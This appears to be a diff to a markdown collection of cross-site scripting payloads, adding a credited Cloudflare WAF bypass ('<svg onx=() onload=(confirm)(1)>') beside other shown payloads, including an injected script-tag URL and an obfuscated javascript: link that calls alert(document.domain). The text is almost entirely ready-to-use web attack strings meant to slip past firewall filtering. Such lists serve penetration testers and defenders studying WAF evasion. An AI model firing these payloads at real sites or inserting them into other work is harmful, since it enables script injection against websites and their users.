@@ -3335,6 +3335,10 @@ http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3csc
 ``` 
 
 ### Cloudflare
+- [XSS Bypass](https://twitter.com/SalahHasoneh1/status/1281254703360344064) by [@@SalahHasoneh1](https://twitter.com/@SalahHasoneh1)
+```
+<svg onx=() onload=(confirm)(1)>
+```
 - [XSS Bypass](https://pastebin.com/i8Ans4d4) by [@c0d3g33k](https://twitter.com/c0d3g33k)
 ```
 <a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>
